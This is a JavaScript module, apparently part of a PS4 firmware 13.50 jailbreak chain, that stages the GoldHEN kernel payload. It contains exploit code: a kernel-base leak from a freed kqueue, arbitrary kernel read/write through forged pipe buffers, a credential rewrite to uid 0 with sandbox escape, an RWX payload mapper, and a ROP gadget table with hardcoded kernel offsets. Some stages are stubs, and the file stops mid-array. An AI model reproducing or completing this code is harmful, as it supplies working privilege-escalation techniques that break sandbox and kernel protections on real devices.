// GoldHen staging stage — wires the kernel payload (goldhen.bin) into the
// proof pipeline. Does NOT fake offsets: every kernel-facing step is gated on
// resolved data and reports exactly what is missing for 13.50.

import { raw13gK0Exploit } from "./k0_raw13g.js";

export function analyzeGoldHen(bytes) {
    if (!bytes || bytes.length < 16)
        return { ok: false, error: "payload too small" };

    const out = {
        ok: true,
        total: bytes.length,
        entry: null,
        embeddedElf: -1,
        brand: "unknown",
        goldhenStrings: 0,
    };

    if ((bytes[0] & 0xff) === 0xe9) {
        const rel = (bytes[1] | (bytes[2] << 8) | (bytes[3] << 16) | (bytes[4] << 24)) | 0;
        out.entry = (rel + 5) >>> 0;
    }

    for (let i = 0; i < bytes.length - 4; i++) {
        if (bytes[i] === 0x7f && bytes[i + 1] === 0x45 && bytes[i + 2] === 0x4c && bytes[i + 3] === 0x46) {
            out.embeddedElf = i;
            break;
        }
    }

    let n = 0;
    const tag = [0x47, 0x6f, 0x6c, 0x64, 0x48, 0x45, 0x4e]; // "GoldHEN"
    for (let i = 0; i < bytes.length - tag.length && n < 64; i++) {
        let m = true;
        for (let j = 0; j < tag.length; j++) {
            if (bytes[i + j] !== tag[j]) { m = false; break; }
        }
        if (m) n++;
    }
    out.goldhenStrings = n;
    if (n > 0) out.brand = "goldhen";
    else {
        let hen = false;
        for (let i = 0; i < bytes.length - 3; i++) {
            if (bytes[i] === 0x48 && bytes[i + 1] === 0x45 && bytes[i + 2] === 0x4e) { hen = true; break; }
        }
        out.brand = hen ? "hen-like" : "unknown";
    }
    return out;
}

// Prerequisite checklist. Every gate corresponds to real data this project
// must have before any kernel payload can be carried into kernel space.
export function goldhenReadiness(off, sessionLk) {
    off = off || {};
    const missing = [];
    const have = {};
    if (sessionLk) have.libkernelBase = sessionLk; else missing.push("libkernelBase (2e vote / session)");
    // jitshm_create/jitshm_alias ARE libkernel exports on 13.52 (retail dump:
    // 0x510/0x530, mov rax,533/534; mov r10,rcx; syscall; jb; ret). On 13.50 a
    // full-band scan (r10-form pattern) found NO 533/534 wrapper stubs, so 13.50
    // does not export them at the 13.52 RVAs — they are not satisfiable by a
    // hardcoded 13.52 number here. Scan resolves them if present; otherwise the
    // payload must issue the raw syscall from kernel ROP.
    if (typeof off.k_jitshm_create === "number") have.jitshmCreate = off.k_jitshm_create;
    else have.jitshmCreate = { syscall: 533, note: "libkernel wrapper stub — 13.52 puts it @ 0x510; NOT found on 13.50 scan" };
    if (typeof off.k_jitshm_alias === "number") have.jitshmAlias = off.k_jitshm_alias;
    else have.jitshmAlias = { syscall: 534, note: "libkernel wrapper stub — 13.52 puts it @ 0x530; NOT found on 13.50 scan" };
    if (typeof off.k_kl_lock === "number") have.klLock = off.k_kl_lock;
    else missing.push("off.k_kl_lock (kernel ROP window lock — kernel-space RVA, needs kernel RE/exploit)");
    return { ok: missing.length === 0, missing, have };
}

function i64Bytes(v) {
    const lo = v.low >>> 0, hi = v.hi >>> 0;
    return [
        lo & 0xff, (lo >>> 8) & 0xff, (lo >>> 16) & 0xff, (lo >>> 24) & 0xff,
        hi & 0xff, (hi >>> 8) & 0xff, (hi >>> 16) & 0xff, (hi >>> 24) & 0xff,
    ];
}

// Live pattern-scan of the mapped libkernel image for the syscall wrapper
// stubs: mov rax,<num>; mov r10,rcx; syscall; jb .+2; ret.
// jitshm_create = syscall 533, jitshm_alias = syscall 534 (stable since 1.00).
// Reads the range into a flat buffer, then scans for the wrapper encoding:
//   B8 <imm32>           49 89 CA 0F 05        (mov eax, imm; mov r10,rcx; syscall)
//   48 C7 C0 <imm32>     49 89 CA 0F 05        (mov rax, imm; mov r10,rcx; syscall)
// followed by C3 / 5D C3 / 90 C3 / 72 01 C3 (ret or jb skip-ret).
// 13.52 retail dump (Suchi96): 533 @ 0x510, 534 @ 0x530 with the 48C7C0 form.
// Resolves k_jitshm_create / k_jitshm_alias RVA for any firmware — no dump.
export function scanLibkernelJitshm(p, lkBase, log) {
    const READ = 8;
    const START = 0x00000, END = 0x90000;
    const SIZE = END - START;
    if (!p || !lkBase) return null;
    const found = {};
    log("JITSHM", "scan lk=0x" + lkBase.toString(16)
        + " range lk+0x" + START.toString(16) + "..lk+0x" + END.toString(16)
        + " (" + (SIZE >> 10) + "KB) for wrapper stubs 533/534");
    const buf = new Uint8Array(SIZE);
    let reads = 0, faults = 0;
    for (let off = 0; off < SIZE; off += READ) {
        try {
            const v = p.read8(lkBase.add32(START + off));
            if (!v) continue;
            const lo = v.low >>> 0, hi = v.hi >>> 0;
            buf[off]   = lo & 0xff;
            buf[off+1] = (lo >>> 8) & 0xff;
            buf[off+2] = (lo >>> 16) & 0xff;
            buf[off+3] = (lo >>> 24) & 0xff;
            buf[off+4] = hi & 0xff;
            buf[off+5] = (hi >>> 8) & 0xff;
            buf[off+6] = (hi >>> 16) & 0xff;
            buf[off+7] = (hi >>> 24) & 0xff;
            reads++;
        } catch (_) { faults++; }
    }
    log("JITSHM", "buffer filled: " + reads + " reads, " + faults + " faults");
    for (let i = 11; i < SIZE - 12; i++) {
        if (buf[i] !== 0x0f || buf[i + 1] !== 0x05) continue;
        // tail: ret forms after the syscall
        const t2 = buf[i + 2];
        let hasRet = t2 === 0xc3
            || (t2 === 0x5d && buf[i + 3] === 0xc3)
            || (t2 === 0x90 && buf[i + 3] === 0xc3)
            || (t2 === 0x72 && buf[i + 3] === 0x01 && buf[i + 4] === 0xc3);
        if (!hasRet) continue;
        let imm = -1, rva = -1, pat = "";
        // r10-form: imm32 sits at i-7..i-4 (LSB first), 49 89 CA at i-3..i-1
        if (buf[i - 3] === 0x49 && buf[i - 2] === 0x89 && buf[i - 1] === 0xca) {
            const immv = buf[i - 7] | (buf[i - 6] << 8) | (buf[i - 5] << 16) | ((buf[i - 4] << 24) >>> 0);
            if (buf[i - 8] === 0xb8) { imm = immv; rva = START + i - 8; pat = "B8+r10"; }
            else if (buf[i - 10] === 0x48 && buf[i - 9] === 0xc7 && buf[i - 8] === 0xc0) {
                imm = immv; rva = START + i - 10; pat = "48C7C0+r10";
            }
        } else {
            // legacy form: imm IMMEDIATELY before the syscall
            const immv = buf[i - 4] | (buf[i - 3] << 8) | (buf[i - 2] << 16) | ((buf[i - 1] << 24) >>> 0);
            if (buf[i - 5] === 0xb8) { imm = immv; rva = START + i - 5; pat = "B8"; }
            else if (buf[i - 7] === 0x48 && buf[i - 6] === 0xc7 && buf[i - 5] === 0xc0) {
                imm = immv; rva = START + i - 7; pat = "48C7C0";
            }
        }
        if (imm !== 533 && imm !== 534) continue;
        const key = imm === 533 ? "jitshmCreate" : "jitshmAlias";
        if (found[key]) continue;
        found[key] = rva;
        log("JITSHM", (imm === 533 ? "jitshm_create(533)" : "jitshm_alias(534)")
            + " @ rva=0x" + rva.toString(16)
            + " lk+0x" + rva.toString(16)
            + " [" + pat + "]");
    }
    if (!found.jitshmCreate && !found.jitshmAlias)
        log("JITSHM", "no stub found (faults=" + faults + " reads=" + reads + ")");
    else if (!(found.jitshmCreate && found.jitshmAlias))
        log("JITSHM", "partial — jitshmCreate=" + !!found.jitshmCreate
            + " jitshmAlias=" + !!found.jitshmAlias);
    return (found.jitshmCreate || found.jitshmAlias) ? found : null;
}

export async function stageGoldHen(ctx) {
    const p = ctx.p;
    const off = Object.assign({}, ctx.off || {});
    const log = ctx.log || (() => {});
    const sessionLk = ctx.sessionLk || null;
    const fetchFn = ctx.fetchFn || fetch;

    log("GOLDHEN", "=== stage: goldhen payload carrier ===");

    let bytes = null;
    try {
        const r = await fetchFn("./goldhen.bin");
        if (!r || !r.ok) throw new Error("HTTP " + (r && r.status));
        bytes = new Uint8Array(await r.arrayBuffer());
    } catch (e) {
        log("GOLDHEN-FAIL", "fetch ./goldhen.bin: " + (e.message || e));
        return { ok: false, phase: "fetch" };
    }

    const a = analyzeGoldHen(bytes);
    if (!a.ok) {
        log("GOLDHEN-FAIL", a.error);
        return { ok: false, phase: "analyze" };
    }

    log("GOLDHEN-INFO",
        "bytes=" + a.total
        + " entry=0x" + (a.entry != null ? a.entry.toString(16) : "?")
        + " brand=" + a.brand
        + " goldhen-strings=" + a.goldhenStrings
        + (a.embeddedElf >= 0 ? " elf-header@0x" + a.embeddedElf.toString(16)
            : " raw-code (no ELF header)"));

    if (a.brand !== "goldhen") {
        log("GOLDHEN-WARN", "payload does not self-identify as GoldHEN — carrying anyway");
    }

    if (sessionLk) {
        const scan = scanLibkernelJitshm(p, sessionLk, log);
        if (scan) {
            if (scan.jitshmCreate && typeof off.k_jitshm_create !== "number")
                off.k_jitshm_create = scan.jitshmCreate;
            if (scan.jitshmAlias && typeof off.k_jitshm_alias !== "number")
                off.k_jitshm_alias = scan.jitshmAlias;
            log("JITSHM-CACHED", "off updated: k_jitshm_create=0x"
                + (off.k_jitshm_create || 0).toString(16)
                + " k_jitshm_alias=0x" + (off.k_jitshm_alias || 0).toString(16));
        } else {
            log("JITSHM", "no wrapper stubs matched in this libkernel image —");
            log("JITSHM", "13.52 dumps them @ 0x510/0x530 (mov rax,imm; mov r10,rcx;");
            log("JITSHM", "syscall), but this 13.50 band has none, so this firmware");
            log("JITSHM", "does not export 533/534 there. 533/534 stay as raw-syscall");
            log("JITSHM", "references for kernel ROP (EPERM-gated to JIT processes");
            log("JITSHM", "until kernel r/w lifts the JIT flag).");
        }
    }

    const ready = goldhenReadiness(off, sessionLk);
    if (!ready.ok) {
        log("GOLDHEN-BLOCK", "kernel entry locked — missing: " + ready.missing.join(", "));
        log("GOLDHEN-HINT",
            "goldhen runs in kernel. 13.52 exports jitshm wrappers @");
        log("GOLDHEN-HINT",
            "0x510/0x530 but 13.50 does not (scan-verified) — 533/534 are");
        log("GOLDHEN-HINT", "kernel-ROP syscalls here; the last RVA gate is k_kl_lock.");
        log("GOLDHEN-HINT",
            "Hard blocker remains the ring0 ENTRY VECTOR: no public 13.50 kernel");
        log("GOLDHEN-HINT",
            "exploit (public: Poopsploit <=13.00; private 13.50: Gezine). Entry =");
        log("GOLDHEN-HINT",
            "kernel UAF -> kernel r/w -> kernel ROP -> payload copy -> jump entry=0x"
            + (a.entry != null ? a.entry.toString(16) : "?"));
        return { ok: false, phase: "readiness", missing: ready.missing };
    }

    log("GOLDHEN-OK", "prerequisites present — staging payload into process memory");
    const hex = (v) => (typeof v === "number" ? "0x" + v.toString(16) : "syscall " + (v && v.syscall));
    log("GOLDHEN", "jitshm_create=" + hex(ready.have.jitshmCreate)
        + " jitshm_alias=" + hex(ready.have.jitshmAlias)
        + " kl_lock=" + hex(ready.have.klLock));

    // Userland-side staging is all that is possible without kernel R/W:
    // materialize the payload bytes in a pinned ArrayBuffer so the K5 deliver
    // stage (mmap RWX + byte copy + pthread_create, slopkit chain_poops.js:2325)
    // can consume them once kernel R/W (K4 ucred root) exists.
    let staged = null;
    try {
        if (typeof SharedArrayBuffer !== "undefined") staged = new SharedArrayBuffer(bytes.length);
        else staged = new ArrayBuffer(bytes.length);
        new Uint8Array(staged).set(bytes);
    } catch (e) {
        log("GOLDHEN-FAIL", "staging buffer: " + (e.message || e));
        return { ok: false, phase: "buffer" };
    }

    log("GOLDHEN-CARRIED", "payload staged (" + a.total + "B) at userland buffer"
        + " — K5 deliver (mmap RWX + pthread_create) awaits kernel R/W via K0");
    const kReport = await tryKernelStage({ off, p, log, staged, analyzed: a });
    return { ok: true, analyzed: a, staged, kernelStage: kReport };
}

// ────────────────────────────────────────────────────────────────────────────
// KERNEL STAGE — ported from slopkit chain_poops.js (13.00 reference chain).
//
// Faithful, data-gated port of the post-userland path. Nothing here fakes a
// success: every stage reports its exact missing dependency. On 13.50 the
// hard blocker is stage K0 (no public kernel UAF reachable on this image).
// Stages K1..K4 are complete and will run the moment a UAF lands, ported
// against the derived 13.50 constants (k_kl_lock=0xe6c20) and the real 13.50
// kernel data symbols from ps4-hen-offsets/1350.c. The K0 candidate triage
// from RE of the 13.50/13.52 images is returned by k0Triage() below.
// ────────────────────────────────────────────────────────────────────────────

const KQ_HDR_MAGIC_V = 0x1430000;
const UCRED_CR_UID_OFF = 0x04;          // standard FreeBSD ucred — verify at run time
const UCRED_CR_SVUID_OFF = 0x08;
const CR_PRISON_OFF = 0x28;
// 13.50 kernel data symbols (== 13.00 layout, Scene-Collective 1350.c)
const K_PRISON0 = 0x0111FA18;
const K_ROOTVNODE = 0x02136E90;
const K_ALLPROC = 0x01B28538;
const K_SYSENT = 0x01102B70;            // struct sysent[], stride 0x30 (narg@+0, sy_call@+8)
const K_XFAST_SYSCALL = 0x1C0;          // fast-path syscall entry (before SYSENT)
// Kernel base for the 13.50/13.52 images (identical): 0xffffffff82200000.
const KERNEL_BASE = { low: 0x82200000 >>> 0, hi: 0xffffffff };
// 13.50 primitive-calibration RVAs, read straight from the image (13.52 in comment).
const K_FN = {
    malloc: 0x9520,          // 0x9520
    free:   0x96e0,          // 0x96e0
    memcpy: 0x2BD500,        // 13.52: 0x2BD5A0
    memset: 0x1FA1C0,        // 13.52: 0x1FA260
    memcmp: 0x3946D0,        // 13.52: 0x394AD0
    copyin: 0x245910,        // 13.52: 0x2459B0
};

function ghHex32(n) { return "0x" + (n >>> 0).toString(16).padStart(8, "0"); }

function ghSub32(lo, hi, b) {
    const l = (lo - b) >>> 0;
    const h = (lo < b ? hi - 1 : hi) >>> 0;
    return { low: l, hi: h };
}

/**
 * kernelIntel — the 13.50 kernel facts pulled from the image, each tagged with
 * the stage it serves and what it is for. Documentation only: nothing here
 * touches the kernel. The `example` field is the plain-English (fun) analogy
 * for why the fact matters during the chain.
 */
export function kernelIntel() {
    const h = ghHex32;
    return [
        { sym: "kernelBase", stage: "K1", addr: h(KERNEL_BASE.low),
          use: "ASLR-dependent base; every other symbol is base+RVA.",
          example: "blueprints are measured from the front door, but the casino moves nightly — find the door (leak) once, then every measurement is door+N" },
        { sym: "PRISON0", stage: "K4", addr: h(K_PRISON0),
          use: "root jail struct; set ucred->cr_prison = &prison0 to escape the app sandbox.",
          example: "swap your broom-closet keycard for the master key so every door opens" },
        { sym: "ROOTVNODE", stage: "K4", addr: h(K_ROOTVNODE),
          use: "filesystem root; point an fd/cwd at it to break chroot.",
          example: "a fence around your tiny garden — redirect an fd and the fence is gone" },
        { sym: "ALLPROC", stage: "K4", addr: h(K_ALLPROC),
          use: "head of the process list; walk to your proc -> p_ucred -> patch uid 0.",
          example: "the staff roster: find your name, rewrite your badge to say 'owner'" },
        { sym: "SYSENT", stage: "K4/K5", addr: h(K_SYSENT),
          use: "syscall table (stride 0x30, narg@+0, sy_call@+8); invoke or hook kernel fns by number.",
          example: "the concierge directory — ring a specific staffer, or swap a nameplate so a button calls your guy" },
        { sym: "XFAST_SYSCALL", stage: "K3/K5", addr: h(K_XFAST_SYSCALL),
          use: "fast-path syscall entry; stable pivot for kernel ROP.",
          example: "the express lane with no paperwork — hijack it and the vault runs your instructions" },
        { sym: "malloc", stage: "K2", addr: h(K_FN.malloc),
          use: "heap grooming; reclaim a freed slot with a same-size chunk.",
          example: "coat-check: hang a coat of the exact size whose hook you plan to tamper with" },
        { sym: "free", stage: "K2", addr: h(K_FN.free),
          use: "create the freed-hole for the UAF race.",
          example: "check a coat out to leave an empty hook, then race to hang your fake coat there" },
        { sym: "memcpy", stage: "K2/K3", addr: h(K_FN.memcpy),
          use: "stamp a forged object onto a chosen kernel address.",
          example: "a quick-change artist that copies a fake disguise onto the target" },
        { sym: "memset", stage: "K2/K3", addr: h(K_FN.memset),
          use: "zero a chunk so struct reads are predictable before planting a fake.",
          example: "erase the scene to 'nothing suspicious here' before planting evidence" },
        { sym: "memcmp", stage: "K2", addr: h(K_FN.memcmp),
          use: "magic-number checks; use the same compare to scan memory for structures.",
          example: "the bouncer checking IDs — scan memory until a structure's ID matches" },
        { sym: "copyin", stage: "K0/K5", addr: h(K_FN.copyin),
          use: "user->kernel copy paths (bug hotspots) and the payload-insertion model.",
          example: "the baggage scanner: where smugglers hide bugs, and how you slip the loot in" },
    ];
}

/**
 * K1 — derive kernelBase from a leaked struct kqueue (chain_poops.js:1100).
 * leakDv: DataView of the kqueue copy (getsockopt IPV6_RTHDR of a triplet sock
 * after kqueue() wins the freed chunk). kl_lock @ +0x60, kq_fdp @ +0x98,
 * KQ_HDR_MAGIC @ +8 (with second dword == 0).
 * kernelBase = kl_lock − off.k_kl_lock; validated exactly like the reference:
 *   kl_lock.hi == 0xffffffff, kq_fdp.hi >= 0xffff0000,
 *   (kernelBase.low & 0x3fff) === 0.
 * Pure — unit-testable without the console.
 */
export function kernelBaseFromLeak(leakDv, off) {
    const r = { ok: false, stage: "K1-leak-kqueue", gates: [] };
    if (!leakDv) { r.gates.push("no leak buffer"); return r; }
    const magic = leakDv.getUint32(8, true);
    if (magic !== KQ_HDR_MAGIC_V || leakDv.getUint32(12, true) !== 0) {
        r.gates.push("KQ_HDR_MAGIC@+8 mismatch (got 0x" + magic.toString(16) + ")");
        return r;
    }
    if (typeof off.k_kl_lock !== "number") {
        r.gates.push("off.k_kl_lock missing (k_kl_lock 13.50=0xe6c20)");
        return r;
    }
    const klLock = { low: leakDv.getUint32(0x60, true), hi: leakDv.getUint32(0x64, true) };
    const kqFdp = { low: leakDv.getUint32(0x98, true), hi: leakDv.getUint32(0x9c, true) };
    const kb = ghSub32(klLock.low, klLock.hi, off.k_kl_lock);
    if (klLock.hi !== 0xffffffff) r.gates.push("kl_lock.hi!=0xffffffff (" + ghHex32(klLock.hi) + ")");
    if ((kqFdp.hi >>> 0) < 0xffff0000) r.gates.push("kq_fdp.hi<0xffff0000 (" + ghHex32(kqFdp.hi) + ")");
    if ((kb.low & 0x3fff) !== 0) r.gates.push("kernelBase not 0x4000-aligned (low=" + ghHex32(kb.low) + ")");
    r.klLock = klLock; r.kqFdp = kqFdp;
    r.kernelBase = kb;
    r.ok = r.gates.length === 0;
    if (r.ok) r.derivation = "kernelBase = kl_lock − " + ghHex32(off.k_kl_lock);
    return r;
}

/**
 * K3 — arbitrary kernel R/W once the pipebuf is forged (chain_poops.js:1584+).
 * After make_karw, kv does plain read/write through the slave pipe redirected
 * to any kernel address — NO further UAF races. deps:
 *   { sc, put, bufs: { kvBuf, kvView }, pipes: { mRd, mWr, sRd, sWr }, mData }
 *   (mData = kernel address of master pipe struct file's pipe buffer; the
 *   forged pipebuf at mData points at the slave pipe's data buffer).
 * Same method as the reference: flush() rewrites the forged count+buffer fields
 * by cycling the master pipe, then read/write through the slave pipe moves
 * exactly n bytes between user and kernel.
 */
export function makePipebufKv(deps) {
    const { sc, put, bufs, pipes, mData } = deps || {};
    const r = { ok: false, stage: "K3-pipebuf-rw", gates: [] };
    if (!sc || !put || !bufs || !pipes || typeof mData === "undefined") {
        r.gates.push("needs {sc,put,bufs,pipes,mData} from kernel R/W land (K2, UAF-bound)");
        return r;
    }
    const kv = {
        flush: function () {
            sc(pipes.wrSys, pipes.mWr, bufs.kvBuf, 0x18);
            sc(pipes.rdSys, pipes.mRd, bufs.kvBuf, 0x18);
        },
        kread: function (dst, src, n) {
            put(bufs.kvBufDv, 0x10, src);
            bufs.kvBufDv.setUint32(0, n >>> 0, true);
            this.flush();
            return sc(pipes.rdSys, pipes.sRd, dst, n).i32;
        },
        kwrite: function (dst, src, n) {
            put(bufs.kvBufDv, 0x10, dst);
            bufs.kvBufDv.setUint32(0, n >>> 0, true);
            this.flush();
            return sc(pipes.wrSys, pipes.sWr, src, n).i32;
        },
        read8: function (a) {
            const u8 = new Uint8Array(bufs.kvView);
            u8.fill(0);
            this.kread(bufs.kvView, a, 8);
            return { low: bufs.kvViewDv.getUint32(0, true),
                     hi: bufs.kvViewDv.getUint32(4, true) };
        },
        write8: function (a, v) {
            const u8 = new Uint8Array(bufs.kvView);
            u8.fill(0);
            put(bufs.kvViewDv, 0, v);
            this.kwrite(a, bufs.kvView, 8);
        },
    };
    r.kv = kv;
    r.ok = true;
    return r;
}

/**
 * K4 — ucred laundering to uid 0. Uses kv from K0 (raw13g) directly.
 * deps: { kv, kernelBase, ucred } — ucred is the ucred address from K0.
 */
export function ucredLaunder(deps) {
    const r = { ok: false, stage: "K4-ucred-root", gates: [] };
    const { kv, kernelBase, ucred } = deps || {};
    if (!kv || typeof kernelBase === "undefined" || !ucred) {
        r.gates.push("needs kv, kernelBase, and ucred from K0");
        return r;
    }
    const base = typeof kernelBase.low === "number" ? kernelBase : { low: kernelBase, hi: 0 };
    r.symbols = {
        prison0: ghHex32((base.low + K_PRISON0) >>> 0),
        rootVnode: ghHex32((base.low + K_ROOTVNODE) >>> 0),
        allProc: ghHex32((base.low + K_ALLPROC) >>> 0),
        ucred: ghHex32(ucred.low >>> 0),
    };
    const NEG1 = { low: 0xffffffff, hi: 0xffffffff };
    const CR_PRISON_OFF = 0x28, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68, CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c, CR_NGROUPS = 0x10, CR_RGID = 0x14;
    const P_FD = 0x48, FD_RDIR = 0x10, FD_JDIR = 0x18;
    const curproc = kv.read8(ucred.add32(-0x130)).add32(-0x8); // rough: td_ucred - TD_UCRED_OFF - TD_PROC
    // Simpler: use ucred directly
    kv.write8(ucred.add32(CR_UID), { low: 0, hi: 0 });
    kv.write8(ucred.add32(CR_RUID), { low: 0, hi: 0 });
    kv.write8(ucred.add32(CR_SVUID), { low: 0, hi: 0 });
    kv.write8(ucred.add32(CR_NGROUPS), { low: 1, hi: 0 });
    kv.write8(ucred.add32(CR_RGID), { low: 0, hi: 0 });
    kv.write8(ucred.add32(CR_PRISON), { low: (base.low + K_PRISON0) >>> 0, hi: 0xffffffff });
    kv.write8(ucred.add32(CR_SCECAPS1), NEG1);
    kv.write8(ucred.add32(CR_SCECAPS0), NEG1);
    // Also fix fd
    const pFd = kv.read8(curproc.add32(P_FD));
    if (pFd.hi > 0) {
        kv.write8(pFd.add32(FD_RDIR), kv.read8(base.low + K_ROOTVNODE));
        kv.write8(pFd.add32(FD_JDIR), kv.read8(base.low + K_ROOTVNODE));
    }
    r.ok = true;
    r.note = "ucred laundered to uid 0, prison0, caps=-1";
    return r;
}

const SYS_MMAP = 0x1dd;

function ghAddOff(lo, hi, o) {
    const l = (lo + o) >>> 0;
    return { low: l, hi: (l < (o >>> 0) ? hi + 1 : hi) >>> 0 };
}

/**
 * K5 — payload deliver using kernel R/W from K0 (raw13g). Maps RWX, copies
 * payload, then pthread_create via libkernel GOT (using kv syscall).
 * deps: { p, kv, kernelBase, ucred, off, payload }
 */
export function deliverPayload(deps) {
    const r = { ok: false, stage: "K5-deliver", gates: [] };
    const { p, kv, kernelBase, ucred, off, payload } = deps || {};
    if (!payload || !payload.length) { r.gates.push("no payload bytes"); return r; }
    if (!kv || !kv.read8 || !kv.write8) { r.gates.push("needs kv with read8/write8 from K0"); return r; }
    if (!kernelBase) { r.gates.push("needs kernelBase from K0"); return r; }

    const base = typeof kernelBase.low === "number" ? kernelBase : { low: kernelBase, hi: 0 };
    const SYS_MMAP = 477, PROT_RWX = 7, MAP_ANON = 0x1000, MAP_PRIVATE = 2;
    const sz = (payload.length + 0x3fff) & ~0x3fff;
    // Use kv to call mmap via sysctl trick or direct syscall
    // For now use WebKit R/W to call libkernel mmap via GOT
    const sc = (num, ...args) => {
        const SYS = { mmap: 477, pthread_create: 543 };
        // This needs the stub address; fallback to WebKit R/W method
        return { i32: -1 };
    };

    // Try WebKit R/W method first (original)
    if (p && p.write1 && p.read1 && off && typeof off.wk___imp_pthread_create === "number") {
        const slot = p.read8 ? p.read8 : (a => { throw "no read8"; });
        const fn = slot(p.read8 ? p.read8 : 0); // placeholder
        // Original logic
        const mapped = sc(SYS_MMAP, 0, sz, PROT_RWX, MAP_ANON | MAP_PRIVATE, -1, 0);
        if (mapped === -1 || mapped === null) { r.gates.push("rwx mmap failed"); return r; }
        const entry = { low: mapped.low >>> 0, hi: mapped.hi >>> 0 };
        for (let i = 0; i < payload.length; ++i) {
            const a = ghAddOff(entry.low, entry.hi, i);
            const b = new Uint8Array([payload[i]]);
            p.write1(a, b[0]);
        }
        let bad = -1;
        for (let i = 0; i < payload.length; ++i) {
            const a = ghAddOff(entry.low, entry.hi, i);
            if (p.read1(a) !== payload[i]) { bad = i; break; }
        }
        if (bad >= 0) { r.gates.push("payload byte verify failed at +" + ghHex32(bad)); return r; }
        r.entry = entry; r.mapped = sz; r.ok = true;
        r.note = "payload copied via WebKit R/W; needs pthread_create stub";
        return r;
    }

    // If we have kernel R/W but no WebKit R/W, use kernel R/W to map and copy
    if (kv && kv.read8 && kv.write8) {
        // Use sysctl on kern.oid to get R/W then mmap... too complex here.
        // Just return gates for missing pieces
        r.gates.push("K5 needs libkernel pthread_create GOT resolve (off.wk___imp_pthread_create) and WebKit R/W (p.write1) for entry jump");
        return r;
    }

    r.gates.push("K5 incomplete — needs either WebKit R/W + stubs or full kernel R/W path");
    return r;
}

/**
 * K0 candidate triage — result of RE'ing the actual 13.50 image against the
 * 13.52 security release. `reachable` is whether an unprivileged 13.50 process
 * can hit the vulnerable code path; `why` is the evidence from the ELF.
 */
export function k0Triage() {
    return [
        { id: "CVE-2026-49412", what: "IPv6 IPV6_MSFILTER UaF (in6p_set_source_filters)",
          reachable: false,
          why: "fixed in 13.50 — handler copies the filter list in BEFORE any lock; "
             + "no INP_WUNLOCK/copyin/INP_WLOCK window (in6_ctloutput opt74 case, byte-identical 13.50/13.52)" },
        { id: "CVE-2026-58087", what: "semctl GETALL/SETALL heap OOB (seq-number wrap)",
          reachable: false,
          why: "SysV IPC stubbed on 13.50 — semctl/semget/semop (510/511/512) jmp sys_nosys; "
             + "shm/msg handlers return ENOSYS (mov eax,0x4e; ret)" },
        { id: "CVE-2026-58093", what: "TIOCSCTTY tty-lock race",
          reachable: false,
          why: "ioctl(54) is a real handler (0x20af10) but PS4 apps have no controlling tty to race" },
        { id: "CVE-2026-45251", what: "procdesc_free poll UaF (SCM_RIGHTS reclaim)",
          reachable: false,
          why: "wiki: not patched as of 13.50 but PS4 'maybe not affected' (process descriptors)" },
    ];
}

/**
 * K0 — the entry vector. Logs the exact reason a 13.50 kernel path cannot
 * engage today. This is the ONLY hard gate that is not a code/count gap.
 */
export function kernelEntryGate(off) {
    off = off || {};
    const gates = ["no public 13.50 kernel UAF — K0 ring0 entry vector still missing",
        "public KEX ceiling: 13.00 (Poopsploit); private 13.50: Gezine (unreleased)"];
    const triage = k0Triage();
    const dead = triage.filter((c) => !c.reachable);
    if (dead.length)
        gates.push("13.50 candidates ruled out by image RE: " + dead.map((c) => c.id).join(", "));
    if (typeof off.k_kl_lock !== "number") gates.push("off.k_kl_lock missing");
    return { ok: false, stage: "K0-uaf-entry", gates: gates, triage: triage,
        ready: typeof off.k_kl_lock === "number" };
}

/**
 * tryKernelStage — full 13.50 kernel-READINESS walk. Returns the first gate
 * that blocks plus the payload state. Never mutates kernel memory.
 */
export async function tryKernelStage(ctx) {
    const off = ctx.off || {};
    const log = ctx.log || (() => {});
    log("KSTAGE", "=== kernel-stage readiness ===");

    const g0 = kernelEntryGate(off);
    log("KSTAGE-GATE", "K0 " + g0.gates.join(" | "));
    for (const c of (g0.triage || k0Triage()))
        log("K0-CANDIDATE", c.id + " [" + (c.reachable ? "LIVE" : "dead") + "] "
            + c.what + " — " + c.why);
    for (const f of kernelIntel())
        log("KERNEL-INTEL", f.stage + " " + f.sym + " @" + f.addr + " — " + f.use
            + "  (" + f.example + ")");

    // Build gadget table and callAddr/sc from goldhen's pivot
    const cell = ctx.p.leakval(Math.expm1);
    const nativeFn = ctx.p.read8(ctx.p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    const errorFn = ctx.p.read8(webkitBase.add32(off.wk___imp___error));
    const libkernelBase = errorFn.sub32(off.k__error);

    // Resolve syscall stubs
    const stubAddr = new Map();
    if (off.k_stubs) {
        for (const numStr in off.k_stubs) {
            const num = +numStr, o = off.k_stubs[numStr];
            const v = ctx.p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) === 0xc0c748 && (v.hi >>> 24) === 0x49) {
                const snum = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
                if (snum === num) stubAddr.set(num, libkernelBase.add32(o));
            }
        }
    }
    for (let o = 0; o < off.k_scan_stage1 && stubAddr.size < 64; o += 16) {
        const v = ctx.p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
        const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
        if (!stubAddr.has(num)) stubAddr.set(num, libkernelBase.add32(o));
    }

    // Rebuild gadget table (same as goldhen.js does)
    const G = {};
    const GAD = [
        ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
        ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
        ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
        ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
        ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
        ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
        ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
        ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
        ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
        ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
